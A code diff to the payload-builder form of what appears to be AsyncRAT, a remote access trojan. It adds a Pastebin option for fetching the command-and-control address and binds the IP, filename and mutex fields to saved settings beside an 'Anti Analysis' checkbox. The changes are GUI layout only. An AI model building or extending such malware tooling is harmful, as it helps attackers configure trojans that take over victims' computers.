@@ -28,6 +28,7 @@
         /// </summary>
         private void InitializeComponent()
         {
+            this.components = new System.ComponentModel.Container();
             System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormBuilder));
             this.button1 = new System.Windows.Forms.Button();
             this.groupBox1 = new System.Windows.Forms.GroupBox();
@@ -42,9 +43,13 @@
             this.label3 = new System.Windows.Forms.Label();
             this.label4 = new System.Windows.Forms.Label();
             this.groupBox3 = new System.Windows.Forms.GroupBox();
-            this.chkAnti = new System.Windows.Forms.CheckBox();
             this.txtMutex = new System.Windows.Forms.TextBox();
             this.label5 = new System.Windows.Forms.Label();
+            this.chkAnti = new System.Windows.Forms.CheckBox();
+            this.txtPastebin = new System.Windows.Forms.TextBox();
+            this.chkPastebin = new System.Windows.Forms.CheckBox();
+            this.label6 = new System.Windows.Forms.Label();
+            this.toolTip1 = new System.Windows.Forms.ToolTip(this.components);
             this.groupBox1.SuspendLayout();
             this.groupBox2.SuspendLayout();
             this.groupBox3.SuspendLayout();
@@ -52,7 +57,7 @@
             // 
             // button1
             // 
-            this.button1.Location = new System.Drawing.Point(10, 705);
+            this.button1.Location = new System.Drawing.Point(10, 818);
             this.button1.Name = "button1";
             this.button1.Size = new System.Drawing.Size(446, 50);
             this.button1.TabIndex = 0;
@@ -62,13 +67,16 @@
             // 
             // groupBox1
             // 
+            this.groupBox1.Controls.Add(this.chkPastebin);
+            this.groupBox1.Controls.Add(this.txtPastebin);
+            this.groupBox1.Controls.Add(this.label6);
             this.groupBox1.Controls.Add(this.textPort);
             this.groupBox1.Controls.Add(this.textIP);
             this.groupBox1.Controls.Add(this.label2);
             this.groupBox1.Controls.Add(this.label1);
             this.groupBox1.Location = new System.Drawing.Point(16, 12);
             this.groupBox1.Name = "groupBox1";
-            this.groupBox1.Size = new System.Drawing.Size(440, 172);
+            this.groupBox1.Size = new System.Drawing.Size(440, 281);
             this.groupBox1.TabIndex = 1;
             this.groupBox1.TabStop = false;
             this.groupBox1.Text = "Connection";
@@ -82,10 +90,12 @@
             // 
             // textIP
             // 
+            this.textIP.DataBindings.Add(new System.Windows.Forms.Binding("Text", global::AsyncRAT_Sharp.Properties.Settings.Default, "IP", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
             this.textIP.Location = new System.Drawing.Point(106, 41);
             this.textIP.Name = "textIP";
             this.textIP.Size = new System.Drawing.Size(271, 26);
             this.textIP.TabIndex = 5;
+            this.textIP.Text = global::AsyncRAT_Sharp.Properties.Settings.Default.IP;
             // 
             // label2
             // 
@@ -112,7 +122,7 @@
             this.groupBox2.Controls.Add(this.textFilename);
             this.groupBox2.Controls.Add(this.label3);
             this.groupBox2.Controls.Add(this.label4);
-            this.groupBox2.Location = new System.Drawing.Point(16, 216);
+            this.groupBox2.Location = new System.Drawing.Point(16, 329);
             this.groupBox2.Name = "groupBox2";
             this.groupBox2.Size = new System.Drawing.Size(440, 211);
             this.groupBox2.TabIndex = 7;
@@ -145,11 +155,13 @@
             // 
             // textFilename
             // 
+            this.textFilename.DataBindings.Add(new System.Windows.Forms.Binding("Text", global::AsyncRAT_Sharp.Properties.Settings.Default, "Filename", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
             this.textFilename.Enabled = false;
             this.textFilename.Location = new System.Drawing.Point(106, 92);
             this.textFilename.Name = "textFilename";
             this.textFilename.Size = new System.Drawing.Size(271, 26);
             this.textFilename.TabIndex = 5;
+            this.textFilename.Text = global::AsyncRAT_Sharp.Properties.Settings.Default.Filename;
             // 
             // label3
             // 
@@ -174,12 +186,30 @@
             this.groupBox3.Controls.Add(this.txtMutex);
             this.groupBox3.Controls.Add(this.label5);
             this.groupBox3.Controls.Add(this.chkAnti);
-            this.groupBox3.Location = new System.Drawing.Point(16, 468);
+            this.groupBox3.Location = new System.Drawing.Point(16, 581);
             this.groupBox3.Name = "groupBox3";
             this.groupBox3.Size = new System.Drawing.Size(440, 174);
             this.groupBox3.TabIndex = 9;
             this.groupBox3.TabStop = false;
             this.groupBox3.Text = "MISC";
+            // 
+            // txtMutex
+            // 
+            this.txtMutex.DataBindings.Add(new System.Windows.Forms.Binding("Text", global::AsyncRAT_Sharp.Properties.Settings.Default, "Mutex", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
+            this.txtMutex.Location = new System.Drawing.Point(106, 99);
+            this.txtMutex.Name = "txtMutex";
+            this.txtMutex.Size = new System.Drawing.Size(271, 26);
+            this.txtMutex.TabIndex = 11;
+            this.txtMutex.Text = global::AsyncRAT_Sharp.Properties.Settings.Default.Mutex;
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Location = new System.Drawing.Point(14, 102);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(52, 20);
+            this.label5.TabIndex = 10;
+            this.label5.Text = "Mutex";
             // 
             // chkAnti
             // 
@@ -191,27 +221,43 @@
             this.chkAnti.Text = "Anti Analysis";
             this.chkAnti.UseVisualStyleBackColor = true;
             // 
-            // txtMutex
+            // txtPastebin
             // 
-            this.txtMutex.Location = new System.Drawing.Point(106, 99);
-            this.txtMutex.Name = "txtMutex";
-            this.txtMutex.Size = new System.Drawing.Size(271, 26);
-            this.txtMutex.TabIndex = 11;
+            this.txtPastebin.DataBindings.Add(new System.Windows.Forms.Binding("Text", global::AsyncRAT_Sharp.Properties.Settings.Default, "Pastebin", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
+            this.txtPastebin.Enabled = false;
+            this.txtPastebin.Location = new System.Drawing.Point(106, 200);
+            this.txtPastebin.Name = "txtPastebin";
+            this.txtPastebin.Size = new System.Drawing.Size(271, 26);
+            this.txtPastebin.TabIndex = 8;
+            this.txtPastebin.Text = global::AsyncRAT_Sharp.Properties.Settings.Default.Pastebin;
+            this.toolTip1.SetToolTip(this.txtPastebin, "IP:PORT .. Example 127.0.0.1:6606");
             // 
-            // label5
+            // chkPastebin
             // 
-            this.label5.AutoSize = true;
-            this.label5.Location = new System.Drawing.Point(14, 102);
-            this.label5.Name = "label5";
-            this.label5.Size = new System.Drawing.Size(52, 20);
-            this.label5.TabIndex = 10;
-            this.label5.Text = "Mutex";
+            this.chkPastebin.AutoSize = true;
+            this.chkPastebin.Location = new System.Drawing.Point(264, 164);
+            this.chkPastebin.Name = "chkPastebin";
+            this.chkPastebin.Size = new System.Drawing.Size(130, 24);
+            this.chkPastebin.TabIndex = 9;
+            this.chkPastebin.Text = "Use Pastebin";
+            this.toolTip1.SetToolTip(this.chkPastebin, "IP:PORT .. Example 127.0.0.1:6606");
+            this.chkPastebin.UseVisualStyleBackColor = true;
+            this.chkPastebin.CheckedChanged += new System.EventHandler(this.CheckBox2_CheckedChanged);
+            // 
+            // label6
+            // 
+            this.label6.AutoSize = true;
+            this.label6.Location = new System.Drawing.Point(14, 203);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(71, 20);
+            this.label6.TabIndex = 7;
+            this.label6.Text = "Pastebin";
             // 
             // FormBuilder
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(9F, 20F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(470, 788);
+            this.ClientSize = new System.Drawing.Size(470, 893);
             this.Controls.Add(this.groupBox3);
             this.Controls.Add(this.groupBox2);
             this.Controls.Add(this.groupBox1);
@@ -249,5 +295,9 @@
         private System.Windows.Forms.CheckBox chkAnti;
         private System.Windows.Forms.TextBox txtMutex;
         private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.TextBox txtPastebin;
+        private System.Windows.Forms.CheckBox chkPastebin;
+        private System.Windows.Forms.Label label6;
+        private System.Windows.Forms.ToolTip toolTip1;
     }
 }
